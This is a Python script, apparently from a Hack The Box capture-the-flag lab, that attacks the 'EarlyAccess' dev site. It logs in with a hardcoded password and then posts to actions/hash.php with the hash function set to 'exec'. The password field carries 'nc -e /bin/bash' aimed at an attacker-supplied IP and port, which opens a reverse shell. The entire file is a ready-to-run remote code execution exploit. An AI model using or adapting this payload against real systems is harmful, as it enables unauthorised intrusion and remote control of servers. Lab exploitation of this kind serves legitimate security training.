#!/usr/bin/env python
# Created by WildZarek - 2022

# EarlyAccess Dev Reverse Shell
import requests
import sys

target = "http://dev.earlyaccess.htb/"

r = requests.get(target)

cookie = r.headers.get('Set-Cookie').rsplit(';', 1)
cookie = cookie[0]

login = {
    "password" : "gameover",
}

r = requests.post(target + "actions/login.php", data=login, verify=False)

if len(sys.argv) == 3:
    local_ip = sys.argv[1]
    if sys.argv[2].isnumeric():
        local_port = sys.argv[2]
        payload = {
            "action": "hash",
            "password": f"nc -e /bin/bash {local_ip} {local_port}",
            "hash_function": "exec",
            "debug": 1
        }
        r = requests.post(target + "actions/hash.php", data=payload, verify=False)
else:
    print(f"[!] Usage: python3 revsh_earlyaccess.py <local_ip> <local_port>")
    sys.exit(1)